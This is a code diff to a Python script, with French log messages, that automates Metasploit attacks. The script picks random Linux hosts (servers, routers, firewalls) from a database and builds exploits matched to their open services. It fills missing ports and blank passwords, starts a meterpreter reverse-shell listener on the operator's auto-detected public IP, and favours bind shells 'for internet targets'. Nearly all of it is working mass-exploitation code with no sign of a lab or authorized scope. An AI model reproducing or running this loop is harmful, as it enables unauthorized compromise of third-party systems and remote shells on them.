@@ -22,8 +22,30 @@ PG_HOST = "postgres"
 MODE_RUN = 1
 DEBUG_MODE = int(os.getenv("DEBUG_MODE", "0"))
 
-LHOST = os.getenv("LHOST", "")
-LPORT = int(os.getenv("LPORT", "4444"))
+def _detect_local_ip() -> str:
+    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
+        try:
+            resp = requests.get(url, timeout=5)
+            ip = resp.text.strip()
+            if ip:
+                print(f"[INFO] IP publique détectée via {url}: {ip}")
+                return ip
+        except Exception:
+            continue
+    # Fallback : IP locale
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        print(f"[WARN] IP publique non disponible, fallback IP locale: {ip}")
+        return ip
+    except Exception:
+        return ""
+
+LHOST = os.getenv("LHOST", "") or _detect_local_ip()
+LPORT = int(os.getenv("LPORT", "4444"))          # port externe (payload) — ex: 24444
+LPORT_BIND = int(os.getenv("LPORT_BIND", str(LPORT)))  # port handler interne — ex: 4444
 BIND_PORT = int(os.getenv("BIND_PORT", "5556"))
 
 
@@ -201,8 +223,10 @@ def get_random_host(type):
             with conn.cursor() as cur:
                 cur.execute(
                     "SELECT id, address FROM hosts TABLESAMPLE SYSTEM(0.1) "
-                    "WHERE os_name = %s AND host(address::inet) NOT LIKE 'fe80:%%' LIMIT 1;",
-                    (type,)
+                    "WHERE os_name ILIKE %s "
+                    "AND purpose IN ('server', 'device', 'router', 'firewall') "
+                    "AND host(address::inet) NOT LIKE 'fe80:%%' LIMIT 1;",
+                    (f'%{type}%',)
                 )
                 return cur.fetchone() or (None, None)
     except psycopg2.Error as e:
@@ -389,14 +413,15 @@ def main():
         for cmd in [
             "use exploit/multi/handler",
             "set PAYLOAD linux/x64/meterpreter/reverse_tcp",
-            f"set LHOST {LHOST}",
-            f"set LPORT {LPORT}",
+            f"set LHOST 0.0.0.0",
+            f"set LPORT {LPORT_BIND}",
+            f"set ReverseListenerBindAddress 0.0.0.0",
             "set ExitOnSession false",
             "exploit -j -z",
         ]:
             console_h.write(cmd + "\n")
             time.sleep(1)
-        print(f"[INFO] Listener multi/handler démarré sur {LHOST}:{LPORT}")
+        print(f"[INFO] Listener multi/handler démarré (bind 0.0.0.0:{LPORT_BIND}, payload {LHOST}:{LPORT})")
     else:
         print("[WARN] LHOST non défini, listener non démarré")
 
@@ -407,9 +432,6 @@ def main():
             return
         print(f"[DEBUG] {len(debug_hosts)} hôte(s) à traiter séquentiellement.")
         debug_index = 0
-    else:
-        search_results = client.modules.search('linux')
-
     upgraded_sessions = set()
 
     while True:
@@ -433,6 +455,7 @@ def main():
      else:
          host_id, host = get_random_host('Linux')
          services = get_host_services_by_address(str(host))
+         search_results = build_targeted_exploits(client, services) if services else []
          min_date = "2021-01-01"
 
      if not host:
@@ -490,6 +513,14 @@ def main():
                         print(f"[SKIP] SESSION requise mais aucune session active")
                case "LHOST":
                     exploit[missing[index1]] = LHOST
+               case "RPORT":
+                    # Prendre le premier port ouvert connu, sinon skip
+                    if open_ports:
+                        exploit[missing[index1]] = next(iter(sorted(open_ports)))
+                    else:
+                        print(f"[SKIP] RPORT requis mais aucun port ouvert connu")
+               case "PASSWORD" | "PASS" | "SMBPass" | "FTP_PASS":
+                    exploit[missing[index1]] = ""
                case _:
                     print (f"Pas traite {missing[index1]}")
         if exploit.missing_required:
@@ -505,6 +536,8 @@ def main():
 #        print (exploit.runoptions)
 #        print (f" payload {payload}")
         payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
+        # Prioriser bind (container → cible) sur reverse (cible → container) pour cibles internet
+        payload = sorted(payload, key=lambda p: (0 if 'bind' in p else 1))
         if (len (payload) > 0):
           if ( MODE_RUN == 1 ):
             for index1 in range(0, len(payload)):
